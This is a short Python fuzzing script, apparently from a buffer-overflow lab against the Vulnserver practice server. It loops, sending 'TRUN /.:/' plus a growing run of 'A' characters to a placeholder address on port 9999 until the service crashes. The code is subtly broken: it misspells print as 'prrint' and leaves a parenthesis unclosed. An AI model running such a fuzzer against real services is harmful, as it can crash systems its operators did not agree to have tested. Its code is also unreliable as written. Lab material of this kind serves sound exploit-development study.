#!/usr/bin/python
import sys,socket
from time import sleep
buffer="A"*100
while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('ip address',9999))
		s.send(("TRUN/.:/"+buffer))
		s.close()
		sleep(1)
		buffer=buffer+ "A"*100
	except:
		prrint("fuzzing crashed at %s buffer"%str(len(buffer))
		sys.exit()